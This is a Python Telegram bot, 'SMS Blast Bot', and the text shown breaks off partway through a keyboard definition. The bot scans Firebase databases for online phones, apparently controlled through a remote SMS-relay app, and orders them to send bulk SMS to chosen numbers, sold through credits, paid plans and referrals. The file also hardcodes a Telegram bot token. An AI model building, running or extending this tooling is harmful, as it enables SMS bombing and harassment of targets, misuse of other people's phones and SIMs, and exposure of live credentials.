#!/usr/bin/env python3
import asyncio, json, os, time, logging, random, string, threading
from datetime import datetime
from copy import deepcopy
from collections import defaultdict

import aiohttp
from flask import Flask, jsonify
from aiogram import Bot, Dispatcher, F, Router
from aiogram.types import (
    Message, CallbackQuery,
    InlineKeyboardMarkup, InlineKeyboardButton,
    ReplyKeyboardMarkup, KeyboardButton,
    ChatMemberUpdated,
    FSInputFile
)
from aiogram.filters import Command, CommandStart
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.exceptions import TelegramBadRequest

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(name)s — %(message)s",
    datefmt="%H:%M:%S"
)
log = logging.getLogger("BlastBot")

FIRE_EFFECT_ID = "5104841245755180586"

SMALL_CAPS_MAP = str.maketrans(
    "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789",
    "ᴀʙᴄᴅᴇғɢʜɪᴊᴋʟᴍɴᴏᴘǫʀsᴛᴜᴠᴡxʏᴢᴀʙᴄᴅᴇғɢʜɪᴊᴋʟᴍɴᴏᴘǫʀsᴛᴜᴠᴡxʏᴢ0123456789"
)

def sc(text: str) -> str:
    return text.translate(SMALL_CAPS_MAP)

def em(emoji_id: str, fallback: str = "⭐") -> str:
    return fallback

def btn(text: str, callback_data: str, emoji_id: str = None, fallback_emoji: str = "") -> InlineKeyboardButton:
    label = f"{fallback_emoji} {sc(text)}".strip() if fallback_emoji else sc(text)
    return InlineKeyboardButton(text=label, callback_data=callback_data)

def btn_url(text: str, url: str, emoji_id: str = None, fallback_emoji: str = "") -> InlineKeyboardButton:
    label = f"{fallback_emoji} {sc(text)}".strip() if fallback_emoji else sc(text)
    return InlineKeyboardButton(text=label, url=url)

def style_btn(text: str, style: str = "primary", request_contact: bool = False, request_location: bool = False) -> KeyboardButton:
    return KeyboardButton(text=text, request_contact=request_contact, request_location=request_location)

MAIN_OWNER = 8994623958
SUPER_ADMIN_NAME = "@rkrusherkingyunv"
SUPER_ADMIN_LINK = "https://t.me/rkrusherkingyunv"
SUPER_ADMINS = [8994623958]

BOT_TOKEN = "8992942480:AAGZS7H874tM-0iwOuQnWJu_WwoJM5lef_c"
LOG_CHANNEL_ID = -1004331432654

_DATA_FILE = "blast_data.json"
_VERSION = "v3.4"
_PROGRESS_UPDATE_INTERVAL = 1.0
_SEND_DELAY = 0.3

SPEED_FAST = 0.05
SPEED_MEDIUM = 0.2
SPEED_SLOW = 0.5
SPEED_DEFAULT = SPEED_MEDIUM

# ========== FLASK ==========
flask_app = Flask(__name__)

@flask_app.route("/")
@flask_app.route("/health")
def health_check():
    try:
        d = load()
        return jsonify({
            "status": "alive", "bot": "SMS Blast Bot", "version": _VERSION,
            "users": len(d.get("users", {})),
            "firebases": len(d.get("firebases", [])),
            "videos": len(d.get("videos", [])),
            "time": datetime.now().isoformat()
        })
    except Exception as e:
        return jsonify({"status": "error", "error": str(e)}), 500

@flask_app.route("/stats")
def stats_endpoint():
    try:
        d = load()
        return jsonify({
            "total_sent": d.get("stats", {}).get("total_sent", 0),
            "total_failed": d.get("stats", {}).get("total_failed", 0),
            "total_users": len(d.get("users", {})),
            "total_firebases": len(d.get("firebases", [])),
            "owners": len(d.get("owners", [])),
            "admins": len(d.get("admins", [])),
        })
    except Exception as e:
        return jsonify({"status": "error", "error": str(e)}), 500

def run_flask():
    port = int(os.environ.get("PORT", 8080))
    flask_app.run(host="0.0.0.0", port=port, debug=False, use_reloader=False)

def start_flask_thread():
    thread = threading.Thread(target=run_flask, daemon=True)
    thread.start()
    log.info(f"Flask health server started on port {os.environ.get('PORT', 8080)}")
    return thread
# =========================================

async def send_fire_effect_private(bot: Bot, chat_id: int):
    try:
        async with aiohttp.ClientSession() as session:
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
            payload = {"chat_id": chat_id, "text": "🔥", "message_effect_id": FIRE_EFFECT_ID}
            async with session.post(url, json=payload, timeout=5) as resp:
                res = await resp.json()
                if res.get("ok"):
                    msg_id = res["result"]["message_id"]
                    await asyncio.sleep(2)
                    del_url = f"https://api.telegram.org/bot{BOT_TOKEN}/deleteMessage"
                    await session.post(del_url, json={"chat_id": chat_id, "message_id": msg_id})
    except Exception as e:
        log.warning(f"Fire Effect Trigger Failed: {e}")

async def send_channel_log(bot: Bot, text: str):
    try:
        await bot.send_message(LOG_CHANNEL_ID, text, parse_mode="HTML")
    except Exception as e:
        log.error(f"Failed to send channel log: {e}")

class UserSession:
    __slots__ = ['uid', 'cancelled', 'sent', 'failed', 'task', 'start_time', 'lock', 'number', 'target_uid']

    def __init__(self, uid: int):
        self.uid = uid
        self.cancelled = False
        self.sent = 0
        self.failed = 0
        self.task = None
        self.start_time = time.time()
        self.lock = asyncio.Lock()
        self.number = None
        self.target_uid = None

USER_SESSIONS = {}
SESSIONS_LOCK = asyncio.Lock()
CACHED_DEVICES = []
LAST_SCAN_TIME = 0
SCANNING_IN_PROGRESS = False
SCAN_STATUS = "⏳ ɴᴏᴛ sᴛᴀʀᴛᴇᴅ"
DEVICE_HEALTH_LOG = []
FB_DEVICE_COUNTS = {}
SCAN_LOCK = asyncio.Lock()
PROTECTED_NUMBERS = {}

class S(StatesGroup):
    send_number = State()
    send_message = State()
    send_speed = State()
    send_count = State()
    owner_send_number = State()
    owner_send_message = State()
    owner_send_speed = State()
    owner_send_count = State()
    admin_send_number = State()
    admin_send_message = State()
    admin_send_speed = State()
    admin_send_count = State()
    redeem_code = State()
    add_firebase = State()
    add_firebase_file = State()
    add_owner = State()
    add_admin = State()
    ban_user = State()
    unban_user = State()
    broadcast = State()
    fj_add_channel = State()
    fj_add_link = State()
    add_plan_name = State()
    add_plan_price = State()
    add_plan_credits = State()
    add_plan_link = State()
    add_credits_uid = State()
    add_credits_amount = State()
    deduct_credits_uid = State()
    deduct_credits_amount = State()
    gen_redeem_credits = State()
    gen_redeem_uses = State()
    set_ref_credits = State()
    protect_number = State()
    track_number = State()
    transfer_credits_uid = State()
    transfer_credits_amount = State()
    add_all_credits_amount = State()
    deduct_all_credits_amount = State()
    add_video = State()

def _default_data() -> dict:
    return {
        "owners": [MAIN_OWNER], "admins": [], "banned": [], "free_mode": False,
        "approved": [], "firebases": [], "users": {},
        "stats": {"total_sent": 0, "total_failed": 0, "api_usage": {}},
        "premium": {"ref_credits": 3},
        "force_join": {"enabled": False, "channels": []},
        "pricing": {"plans": []}, "redeem_codes": {},
        "settings": {"ref_credits": 3, "max_owners": 6},
        "sms_history": {}, "activity_log": [],
        "protected_numbers": {}, "videos": []
    }

def load() -> dict:
    if os.path.exists(_DATA_FILE):
        try:
            with open(_DATA_FILE, "r", encoding="utf-8") as f:
                data = json.load(f)
            default = _default_data()
            for k, v in default.items():
                if k not in data:
                    data[k] = v
            if MAIN_OWNER not in data.get("owners", []):
                data["owners"].insert(0, MAIN_OWNER)
            for uid_str, u in data.get("users", {}).items():
                if "credits" not in u: u["credits"] = 0
                if "sms_history" not in u: u["sms_history"] = []
            return data
        except Exception as e:
            log.error(f"Load error: {e}")
    d = _default_data()
    save(d)
    return d

def save(d: dict):
    with open(_DATA_FILE, "w", encoding="utf-8") as f:
        json.dump(d, f, indent=2, ensure_ascii=False)

def reg_user(uid: int, name: str, d: dict) -> bool:
    k = str(uid)
    if k not in d["users"]:
        d["users"][k] = {
            "name": name, "uses": 0, "credits": 0,
            "joined_at": int(time.time()),
            "refer_code": None, "referred_by": None, "sms_history": []
        }
        return True
    return False

def log_activity(d: dict, action: str, uid: int, details: str = ""):
    d.setdefault("activity_log", []).append({
        "timestamp": int(time.time()), "uid": uid, "action": action, "details": details
    })
    if len(d["activity_log"]) > 1000:
        d["activity_log"] = d["activity_log"][-1000:]

def is_main_owner(uid: int) -> bool: return uid == MAIN_OWNER
def is_owner(uid: int, d: dict) -> bool:
    return uid in d.get("owners", [MAIN_OWNER]) or uid in SUPER_ADMINS
def is_admin(uid: int, d: dict) -> bool:
    return is_owner(uid, d) or uid in d.get("admins", [])
def is_banned(uid: int, d: dict) -> bool:
    return uid in d.get("banned", [])
def can_use(uid: int, d: dict) -> bool:
    if is_banned(uid, d): return False
    if is_admin(uid, d): return True
    if d.get("free_mode"): return True
    if uid in d.get("approved", []): return True
    return False

def role_tag(uid: int, d: dict) -> str:
    if is_main_owner(uid): return "👑 ᴍᴀɪɴ ᴏᴡɴᴇʀ"
    if is_owner(uid, d): return "🔱 ᴏᴡɴᴇʀ"
    if uid in d.get("admins", []): return "🛡 ᴀᴅᴍɪɴ"
    if uid in d.get("approved", []): return "✅ ᴀᴘᴘʀᴏᴠᴇᴅ"
    if d.get("free_mode"): return "🆓 ғʀᴇᴇ ᴜsᴇʀ"
    return "❌ ɴᴏ ᴀᴄᴄᴇss"

def get_user_credits(uid: int, d: dict) -> int:
    return d.get("users", {}).get(str(uid), {}).get("credits", 0)

def add_credits(uid: int, amount: int, d: dict):
    k = str(uid)
    if k not in d.get("users", {}): d["users"][k] = {"credits": 0}
    d["users"][k]["credits"] = d["users"][k].get("credits", 0) + amount

def deduct_credits(uid: int, amount: int, d: dict) -> bool:
    k = str(uid)
    if k in d.get("users", {}):
        current = d["users"][k].get("credits", 0)
        if current >= amount:
            d["users"][k]["credits"] = current - amount
            return True
    return False

def generate_user_refer_code(uid: int, d: dict) -> str:
    k = str(uid)
    if k in d.get("users", {}) and d["users"][k].get("refer_code"):
        return d["users"][k]["refer_code"]
    while True:
        code = "REF" + "".join(random.choices(string.ascii_uppercase + string.digits, k=8))
        exists = any(u.get("refer_code") == code for u in d.get("users", {}).values())
        if not exists: break
    if k in d.get("users", {}): d["users"][k]["refer_code"] = code
    return code

def process_referral(new_uid: int, code: str, d: dict) -> tuple:
    referrer_uid = None
    for uid_str, udata in d.get("users", {}).items():
        if udata.get("refer_code") == code:
            referrer_uid = int(uid_str); break
    if not referrer_uid: return False, "❌ ɪɴᴠᴀʟɪᴅ ʀᴇғᴇʀʀᴀʟ ᴄᴏᴅᴇ!", None
    if referrer_uid == new_uid: return False, "❌ ᴀᴘɴᴀ ᴄᴏᴅᴇ ᴋʜᴜᴅ ᴜsᴇ ɴᴀʜɪɴ ᴋᴀʀ sᴀᴋᴛᴇ!", None
    if d["users"].get(str(new_uid), {}).get("referred_by"):
        return False, "❌ ᴀᴀᴘ ᴘᴇʜʟᴇ sᴇ ʀᴇғᴇʀ ʜᴏ ᴄʜᴜᴋᴇ ʜᴀɪɴ!", None
    ref_credits = d.get("settings", {}).get("ref_credits", 3)
    add_credits(new_uid, ref_credits, d)
    add_credits(referrer_uid, ref_credits, d)
    d["users"][str(new_uid)]["referred_by"] = referrer_uid
    save(d)
    return True, f"🎉 ᴡᴇʟᴄᴏᴍᴇ! ᴀᴀᴘᴋᴏ {ref_credits} ᴄʀᴇᴅɪᴛs ᴍɪʟᴇ ʜᴀɪɴ!", referrer_uid

async def send_random_video(bot: Bot, chat_id: int, caption: str = ""):
    d = load()
    videos = d.get("videos", [])
    if videos:
        video_item = random.choice(videos)
        try:
            await bot.send_video(chat_id, video=video_item, caption=caption, parse_mode="HTML")
        except Exception as e:
            log.error(f"Failed to send random video: {e}")

def kb(*rows) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=t, callback_data=c) for t, c in row]
        for row in rows
    ])

def speed_kb(prefix: str) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            btn("ғᴀsᴛ", f"{prefix}:speed:fast", None, "🚀"),
            btn("ᴍᴇᴅɪᴜᴍ", f"{prefix}:speed:medium", None, "⚡"),
            btn("sʟᴏᴡ", f"{prefix}:speed:slow", None, "🐢")
        ],
        [btn("ᴄᴀɴᴄᴇʟ", f"{prefix}:home", None, "❌")]
    ])

def progress_bar(current: int, total: int, width: int = 20) -> str:
    if total <= 0: return "░" * width
    filled = min(width, int(width * current / total))
    return "█" * filled + "░" * (width - filled)

def progress_text(sent: int, failed: int, total: int, credits: int = None, speed_label: str = "⚡ MEDIUM") -> str:
    bar = progress_bar(sent + failed, total)
    percent = int(((sent + failed) / total) * 100) if total > 0 else 0
    lines = [
        f"⏳ <b>{sc('sending sms...')}</b>\n",
        f"{bar} <b>{percent}%</b>\n",
        f"✅ sᴇɴᴛ: <b>{sent}</b>",
        f"❌ ғᴀɪʟᴇᴅ: <b>{failed}</b>",
        f"📊 ᴘʀᴏɢʀᴇss: <b>{sent + failed}</b> / <b>{total}</b>",
        f"⚡ sᴘᴇᴇᴅ: <b>{speed_label}</b>\n",
    ]
    if credits is not None:
        lines.append(f"💳 ᴄʀᴇᴅɪᴛs ʟᴇғᴛ: <b>{credits}</b>")
    lines.append(f"\n<i>🛑 sᴛᴏᴘ ʙᴜᴛᴛᴏɴ ᴅᴀʙᴀʏᴇɪɴ ᴀɢᴀʀ ʙᴇᴇᴄʜ ᴍᴇɪɴ ʀᴏᴋɴᴀ ʜᴏ.</i>")
    return "\n".join(lines)

def stop_send_kb() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [btn("sᴛᴏᴘ sᴇɴᴅɪɴɢ", "user:stop_send", None, "🛑")]
    ])

def mask_number(number: str) -> str:
    if len(number) <= 4: return number
    return number[:2] + "******" + number[-4:]

def get_scan_status() -> str:
    global SCAN_STATUS, CACHED_DEVICES, LAST_SCAN_TIME, SCANNING_IN_PROGRESS
    if SCANNING_IN_PROGRESS: return "⏳ sᴄᴀɴɴɪɴɢ..."
    if not CACHED_DEVICES: return "🔴 ɴᴏ ᴅᴇᴠɪᴄᴇs"
    dc = len(CACHED_DEVICES)
    td = time.time() - LAST_SCAN_TIME
    if td < 60: return f"🟢 {dc} ᴅᴇᴠɪᴄᴇs"
    elif td < 300: return f"🟡 {dc} ᴅᴇᴠɪᴄᴇs ({int(td/60)}ᴍ ᴏʟᴅ)"
    else: return f"🔴 {dc} ᴅᴇᴠɪᴄᴇs ({int(td/60)}ᴍ ᴏʟᴅ)"

async def run_firebase_scan_once(bot: Bot = None):
    global CACHED_DEVICES, LAST_SCAN_TIME, SCANNING_IN_PROGRESS, SCAN_STATUS, DEVICE_HEALTH_LOG
    async with SCAN_LOCK:
        if SCANNING_IN_PROGRESS: return False
        SCANNING_IN_PROGRESS = True
    SCAN_STATUS = "🔍 sᴄᴀɴɴɪɴɢ ғɪʀᴇʙᴀsᴇ ᴀᴘɪs..."
    start_scan = time.time()
    try:
        d = load()
        fbs = d.get("firebases", [])
        if not fbs:
            SCAN_STATUS = "⚠️ ɴᴏ ғɪʀᴇʙᴀsᴇ ᴅʙs ᴄᴏɴғɪɢᴜʀᴇᴅ"
            CACHED_DEVICES = []
            return False
        devices = await get_all_online_devices(d)
        scan_duration = time.time() - start_scan
        CACHED_DEVICES = devices
        for fb in fbs:
            fb_id = fb["id"]
            fb_label = fb.get("label", fb["url"][:30])
            fb_online = sum(1 for dv in devices if dv["fb_id"] == fb_id)
            FB_DEVICE_COUNTS[fb_id] = {"label": fb_label, "online": fb_online, "last_update": int(time.time())}
        LAST_SCAN_TIME = time.time()
        if devices:
            SCAN_STATUS = f"🟢 {len(devices)} ᴅᴇᴠɪᴄᴇs ᴏɴʟɪɴᴇ"
        else:
            SCAN_STATUS = "🔴 ɴᴏ ᴅᴇᴠɪᴄᴇs ᴏɴʟɪɴᴇ"
        return True
    except Exception as e:
        SCAN_STATUS = f"❌ ᴇʀʀᴏʀ: {str(e)[:30]}"
        log.error(f"[SCAN] Error: {e}")
        return False
    finally:
        async with SCAN_LOCK:
            SCANNING_IN_PROGRESS = False

async def initial_firebase_scan(bot: Bot):
    log.info("Initial Firebase Scanner STARTED")
    await run_firebase_scan_once(bot)
    try:
        d = load()
        await bot.send_message(
            MAIN_OWNER,
            f"🚀 <b>{sc('scanner ready!')}</b>\n\n"
            f"📱 ᴅᴇᴠɪᴄᴇs ᴏɴʟɪɴᴇ: <b>{len(CACHED_DEVICES)}</b>\n"
            f"🔥 ғɪʀᴇʙᴀsᴇ ᴅʙs: <b>{len(d.get('firebases', []))}</b>\n"
            f"🔄 ᴜsᴇ ʀᴇғʀᴇsʜ ʙᴜᴛᴛᴏɴ ᴛᴏ sᴄᴀɴ ᴀɢᴀɪɴ",
            parse_mode="HTML"
        )
    except Exception as e:
        log.warning(f"Owner notify failed: {e}")

def get_cached_devices() -> list:
    return CACHED_DEVICES

async def fb_get(base_url: str, path: str) -> dict:
    url = base_url.rstrip("/") + path
    try:
        async with aiohttp.ClientSession() as s:
            async with s.get(url, timeout=aiohttp.ClientTimeout(total=8)) as r:
                if r.status == 200:
                    txt = (await r.text()).strip()
                    if txt == "null" or not txt: return {}
                    return json.loads(txt)
    except Exception as e:
        log.warning(f"fb_get {url}: {e}")
    return {}

async def fb_put(base_url: str, path: str, payload: dict) -> bool:
    url = base_url.rstrip("/") + path
    for attempt in range(3):
        try:
            async with aiohttp.ClientSession() as s:
                async with s.put(url, json=payload, timeout=aiohttp.ClientTimeout(total=6)) as r:
                    if 200 <= r.status < 300: return True
        except Exception as e:
            log.warning(f"fb_put attempt {attempt+1}: {e}")
        await asyncio.sleep(0.5 * (attempt + 1))
    return False

def device_is_online(device_data: dict) -> bool:
    return any([
        device_data.get("isOnline"), device_data.get("online"),
        device_data.get("connected"),
        device_data.get("status") in ("online", "active", True, 1)
    ])

async def get_all_online_devices(d: dict) -> list:
    fbs = d.get("firebases", [])
    if not fbs: return []
    results = []
    current_fb_ids = {fb["id"] for fb in fbs}
    global CACHED_DEVICES
    CACHED_DEVICES = [dev for dev in CACHED_DEVICES if dev.get("fb_id") in current_fb_ids]
    _dev_sem = asyncio.Semaphore(15)

    async def fetch_one(fb: dict):
        shallow_url = fb["url"].rstrip("/") + "/clients.json?shallow=true"
        try:
            async with aiohttp.ClientSession() as s:
                async with s.get(shallow_url, timeout=aiohttp.ClientTimeout(total=10)) as r:
                    if r.status != 200: return
                    txt = (await r.text()).strip()
                    if txt == "null" or not txt: return
                    device_ids = json.loads(txt)
                    if not isinstance(device_ids, dict): return
                    async def fetch_dev(dev_id: str):
                        try:
                            url = fb["url"].rstrip("/") + f"/clients/{dev_id}.json"
                            async with _dev_sem:
                                async with s.get(url, timeout=aiohttp.ClientTimeout(total=8)) as r2:
                                    if r2.status == 200:
                                        txt2 = (await r2.text()).strip()
                                        if txt2 == "null" or not txt2: return None
                                        dev_data = json.loads(txt2)
                                        if isinstance(dev_data, dict) and device_is_online(dev_data):
                                            name = dev_data.get("deviceName") or dev_data.get("name") or dev_id[:16]
                                            sims = dev_data.get("sims", [])
                                            return {"fb_id": fb["id"], "fb_url": fb["url"],
                                                    "fb_label": fb.get("label", fb["url"][:30]),
                                                    "dev_id": dev_id, "dev_name": name, "sims": sims}
                        except Exception as e:
                            log.warning(f"Device fetch {dev_id}: {e}")
                        return None
                    dev_ids = list(device_ids.keys())
                    for i in range(0, len(dev_ids), 20):
                        batch = dev_ids[i:i+20]
                        dev_tasks = [fetch_dev(dev_id) for dev_id in batch]
                        dev_results = await asyncio.gather(*dev_tasks)
                        for res in dev_results:
                            if res: results.append(res)
        except Exception as e:
            log.warning(f"fb_shallow_get {fb['url']}: {e}")

    await asyncio.gather(*(fetch_one(fb) for fb in fbs))
    return results

async def send_sms_via_device(fb_url: str, dev_id: str, sim_slot: int, to: str, message: str) -> bool:
    return await fb_put(
        fb_url, f"/clients/{dev_id}/webhookEvent/sendSms.json",
        {"from": sim_slot, "to": to.strip(), "message": message.strip(),
         "isSended": False, "timestamp": int(time.time())}
    )

async def check_membership(bot: Bot, uid: int, channel_id: str) -> bool:
    try:
        chat_id = int(str(channel_id).strip())
        member = await bot.get_chat_member(chat_id, uid)
        return member.status in ("member", "administrator", "creator")
    except Exception as e:
        log.error(f"Force Join check failed: {e}")
        return False

async def user_joined_all(bot: Bot, uid: int, d: dict) -> tuple[bool, list]:
    if is_owner(uid, d): return True, []
    fj = d.get("force_join", {})
    if not fj.get("enabled", False): return True, []
    channels = fj.get("channels", [])
    missing = []
    for ch in channels:
        if ch.get("required", True):
            if not await check_membership(bot, uid, ch["id"]):
                missing.append(ch)
    return len(missing) == 0, missing

def force_join_text(missing: list) -> str:
    lines = [
        f"⛔ <b>{sc('bot use karne ke liye pehle join karein!')}</b>\n\n",
        f"👇 ɴɪᴄʜᴇ ᴅɪʏᴇ ɢᴀʏᴇ ᴄʜᴀɴɴᴇʟs/ɢʀᴏᴜᴘs ᴊᴏɪɴ ᴋᴀʀᴇɪɴ:"
    ]
    for ch in missing:
        lines.append(f"\n• <a href='{ch['link']}'>{ch.get('title', 'Channel')}</a>")
    lines.append(f"\n\n<i>{sc('join karne ke baad /start karein.')}</i>")
    return "\n".join(lines)

def force_join_kb(missing: list) -> InlineKeyboardMarkup:
    rows = []
    for ch in missing:
        rows.append([btn_url(f"ᴊᴏɪɴ {ch.get('title', 'Channel')}", ch["link"], None, "🔔")])
    rows.append([btn("ʀᴇғʀᴇsʜ / ᴄʜᴇᴄᴋ", "fj:check", None, "🔄")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

def fmt_time(ts: int) -> str:
    return datetime.fromtimestamp(ts).strftime("%d/%m/%Y %H:%M")

def fmt_duration(seconds: int) -> str:
    if seconds < 60: return f"{seconds}s"
    return f"{seconds // 60}m {seconds % 60}s"

def owner_panel_text(d: dict) -> str:
    fbs = d.get("firebases", [])
    owners = d.get("owners", [])
    admins = d.get("admins", [])
    users = d.get("users", {})
    stats = d.get("stats", {})
    videos = d.get("videos", [])
    mode = "🟢 ғʀᴇᴇ" if d.get("free_mode") else "🔴 ᴀᴘᴘʀᴏᴠᴀʟ"
    fj = d.get("force_join", {})
    fj_status = "🟢 ᴏɴ" if fj.get("enabled") else "🔴 ᴏғғ"
    active_sessions = len([s for s in USER_SESSIONS.values() if s.task and not s.task.done()])
    scan_info = get_scan_status()

    fb_lines = []
    for fb_id, fb_data in FB_DEVICE_COUNTS.items():
        age = int(time.time() - fb_data.get("last_update", 0))
        status = "🟢" if age < 60 else "🟡" if age < 300 else "🔴"
        fb_lines.append(f"  {status} {fb_data['label'][:20]}: {fb_data['online']} ᴏɴʟɪɴᴇ")
    fb_summary = "\n".join(fb_lines) if fb_lines else "  😴 ɴᴏ ᴅᴀᴛᴀ"

    return (
        f"👑 <b>{sc('owner panel')}</b> — sᴍs ʙʟᴀsᴛ ʙᴏᴛ {_VERSION}\n"
        f"<b>Owner:</b> {SUPER_ADMIN_NAME}\n\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"🔥 ғɪʀᴇʙᴀsᴇ ᴅʙs  : <b>{len(fbs)}</b>\n"
        f"👑 sᴜᴘᴇʀ ᴀᴅᴍɪɴs  : <b>{len(owners)}</b>/6\n"
        f"🛡 ᴀᴅᴍɪɴs        : <b>{len(admins)}</b>\n"
        f"👥 ᴛᴏᴛᴀʟ ᴜsᴇʀs   : <b>{len(users)}</b>\n"
        f"📹 ᴠɪᴅᴇᴏs        : <b>{len(videos)}</b>\n"
        f"📤 ᴛᴏᴛᴀʟ sᴇɴᴛ    : <b>{stats.get('total_sent', 0)}</b>\n"
        f"❌ ᴛᴏᴛᴀʟ ғᴀɪʟᴇᴅ  : <b>{stats.get('total_failed', 0)}</b>\n"
        f"🚀 ᴀᴄᴛɪᴠᴇ sᴇɴᴅs  : <b>{active_sessions}</b>\n"
        f"🔓 ᴀᴄᴄᴇss ᴍᴏᴅᴇ   : {mode}\n"
        f"📢 ғᴏʀᴄᴇ ᴊᴏɪɴ    : {fj_status}\n"
        f"💳 ᴘʀɪᴄɪɴɢ ᴘʟᴀɴs : <b>{len(d.get('pricing', {}).get('plans', []))}</b>\n"
        f"🔒 ᴘʀᴏᴛᴇᴄᴛᴇᴅ     : <b>{len(PROTECTED_NUMBERS)}</b>\n"
        f"📱 ᴘᴇʀ ғɪʀᴇʙᴀsᴇ  :\n{fb_summary}\n"
        f"🔄 sᴄᴀɴɴᴇʀ       : {scan_info}\n"
        f"━━━━━━━━━━━━━━━━━━"
    )

def admin_panel_text(d: dict) -> str:
    users = d.get("users", {})
    stats = d.get("stats", {})
    banned = d.get("banned", [])
    videos = d.get("videos", [])
    mode = "🟢 ғʀᴇᴇ" if d.get("free_mode") else "🔴 ᴀᴘᴘʀᴏᴠᴀʟ"
    active_sessions = len([s for s in USER_SESSIONS.values() if s.task and not s.task.done()])
    scan_info = get_scan_status()

    fb_lines = []
    for fb_id, fb_data in FB_DEVICE_COUNTS.items():
        age = int(time.time() - fb_data.get("last_update", 0))
        status = "🟢" if age < 60 else "🟡" if age < 300 else "🔴"
        fb_lines.append(f"  {status} {fb_data['label'][:20]}: {fb_data['online']} ᴏɴʟɪɴᴇ")
    fb_summary = "\n".join(fb_lines) if fb_lines else "  😴 ɴᴏ ᴅᴀᴛᴀ"

    return (
        f"🛡 <b>{sc('admin panel')}</b> — sᴍs ʙʟᴀsᴛ ʙᴏᴛ {_VERSION}\n\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"👥 ᴛᴏᴛᴀʟ ᴜsᴇʀs   : <b>{len(users)}</b>\n"
        f"📹 ᴠɪᴅᴇᴏs        : <b>{len(videos)}</b>\n"
        f"🚫 ʙᴀɴɴᴇᴅ        : <b>{len(banned)}</b>\n"
        f"📤 ᴛᴏᴛᴀʟ sᴇɴᴛ    : <b>{stats.get('total_sent', 0)}</b>\n"
        f"❌ ᴛᴏᴛᴀʟ ғᴀɪʟᴇᴅ  : <b>{stats.get('total_failed', 0)}</b>\n"
        f"🚀 ᴀᴄᴛɪᴠᴇ sᴇɴᴅs  : <b>{active_sessions}</b>\n"
        f"🔥 ғɪʀᴇʙᴀsᴇ ᴅʙs  : <b>{len(d.get('firebases', []))}</b>\n"
        f"🔒 ᴘʀᴏᴛᴇᴄᴛᴇᴅ     : <b>{len(PROTECTED_NUMBERS)}</b>\n"
        f"📱 ᴘᴇʀ ғɪʀᴇʙᴀsᴇ  :\n{fb_summary}\n"
        f"🔓 ᴀᴄᴄᴇss ᴍᴏᴅᴇ   : {mode}\n"
        f"🔄 sᴄᴀɴɴᴇʀ       : {scan_info}\n"
        f"━━━━━━━━━━━━━━━━━━"
    )

def user_home_text(uid: int, d: dict) -> str:
    udata = d["users"].get(str(uid), {})
    fbs = d.get("firebases", [])
    credits = udata.get("credits", 0)
    scan_info = get_scan_status()
    return (
        f"📱 <b>sᴍs ʙʟᴀsᴛ ʙᴏᴛ {_VERSION}</b>\n"
        f"<b>Owner:</b> {SUPER_ADMIN_NAME}\n\n"
        f"👤 ʀᴏʟᴇ    : {role_tag(uid, d)}\n"
        f"💰 ᴄʀᴇᴅɪᴛs : <b>{credits}</b>\n"
        f"🔢 ᴜsᴇs    : <b>{udata.get('uses', 0)}</b>\n"
        f"🔥 ᴀᴘɪs    : <b>{len(fbs)}</b> ғɪʀᴇʙᴀsᴇ(s)\n"
        f"🔄 sᴄᴀɴɴᴇʀ : {scan_info}\n\n"
        f"ᴛᴀᴘ <b>{sc('send sms')}</b> ᴛᴏ sᴛᴀʀᴛ 🚀"
    )

def owner_kb(d: dict) -> InlineKeyboardMarkup:
    mode_text = "🔴 ᴅɪsᴀʙʟᴇ ғʀᴇᴇ ᴍᴏᴅᴇ" if d.get("free_mode") else "🟢 ᴇɴᴀʙʟᴇ ғʀᴇᴇ ᴍᴏᴅᴇ"
    mode_cb = "owner:free:off" if d.get("free_mode") else "owner:free:on"
    return InlineKeyboardMarkup(inline_keyboard=[
        [btn("sᴇɴᴅ sᴍs", "owner:send", None, "📤"), btn("ᴍᴀɴᴀɢᴇ ғɪʀᴇʙᴀsᴇ", "owner:fb:menu:0", None, "🔥")],
        [btn("ᴍᴀɴᴀɢᴇ ᴠɪᴅᴇᴏs", "owner:videos:menu", None, "📹"), btn("ᴍᴀɴᴀɢᴇ sᴜᴘᴇʀ ᴀᴅᴍɪɴs", "owner:owners:menu", None, "👑")],
        [btn("ᴍᴀɴᴀɢᴇ ᴀᴅᴍɪɴs", "owner:admins:menu", None, "🛡"), btn("ᴠɪᴇᴡ ᴜsᴇʀs", "owner:users:list", None, "👥")],
        [btn("ʙᴀɴ ᴜsᴇʀ", "owner:ban", None, "🚫"), btn("ᴜɴʙᴀɴ ᴜsᴇʀ", "owner:unban:menu", None, "✅")],
        [btn("ʙʀᴏᴀᴅᴄᴀsᴛ", "owner:broadcast", None, "📢"), btn("ᴀᴘɪ sᴛᴀᴛs", "owner:stats", None, "📊")],
        [btn("ᴀᴄᴛɪᴠɪᴛɪ ʟᴏɢ", "owner:activity", None, "📜"), btn("ᴘʀɪᴄɪɴɢ ᴘʟᴀɴs", "owner:pricing:menu", None, "💳")],
        [btn("ʀᴇᴅᴇᴇᴍ ᴄᴏᴅᴇs", "owner:redeem:menu", None, "🎁"), btn("ᴀᴅᴅ ᴄʀᴇᴅɪᴛs", "owner:credits:add", None, "💰")],
        [btn("ᴅᴇᴅᴜᴄᴛ ᴄʀᴇᴅɪᴛs", "owner:credits:deduct", None, "💸"), btn("ᴀᴅᴅ ᴄʀᴇᴅɪᴛs ᴀʟʟ", "owner:add_all_credits", None, "➕")],
        [btn("ᴅᴇᴅᴜᴄᴛ ᴀʟʟ", "owner:deduct_all_credits", None, "➖"), btn("ғᴏʀᴄᴇ ᴊᴏɪɴ", "owner:fj:menu", None, "🔗")],
        [btn("sᴇᴛᴛɪɴɢs", "owner:settings", None, "⚙️"), btn("sᴍs ʜɪsᴛᴏʀʏ", "owner:sms_history", None, "📋")],
